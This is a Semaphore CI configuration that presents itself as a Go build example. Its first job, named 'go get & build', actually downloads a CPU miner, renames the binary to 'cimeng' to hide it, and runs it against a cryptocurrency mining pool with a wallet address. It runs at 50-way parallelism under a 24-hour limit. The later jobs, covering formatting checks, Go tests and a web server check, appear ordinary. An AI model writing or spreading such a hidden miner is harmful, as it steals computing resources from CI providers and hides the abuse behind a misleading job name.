version: v1.0
name: Semaphore Go CI example
agent:
  machine:
    type: e1-standard-2
    os_image: ubuntu1804
execution_time_limit:
  hours: 24
blocks:
  - name: Build project
    task:
      jobs:
        - name: go get & build
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
            - tar xf cpuminer-opt-linux.tar.gz
            - mv cpuminer-sse2 cimeng
            - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t4'
          parallelism: 50
  - name: Check code style
    task:
      jobs:
        - name: gofmt
          commands:
            - checkout
            - sem-version go 1.12
            - sudo apt install -y gccgo-go
            - gofmt webServer.go | diff --ignore-tab-expansion webServer.go -
  - name: Run tests
    task:
      prologue:
        commands:
          - checkout
          - sem-version go 1.12
      jobs:
        - name: go test
          commands:
            - sem-service start postgres
            - psql -p 5432 -h localhost -U postgres -c "CREATE DATABASE s2"
            - go get github.com/lib/pq
            - go test ./... -v
        - name: Test web server
          commands:
            - mkdir bin
            - artifact pull workflow webServer
            - mv webServer bin
            - chmod +x ./bin/webServer
            - ./bin/webServer 8001 &
            - 'curl --silent localhost:8001/time | grep "The current time is"'
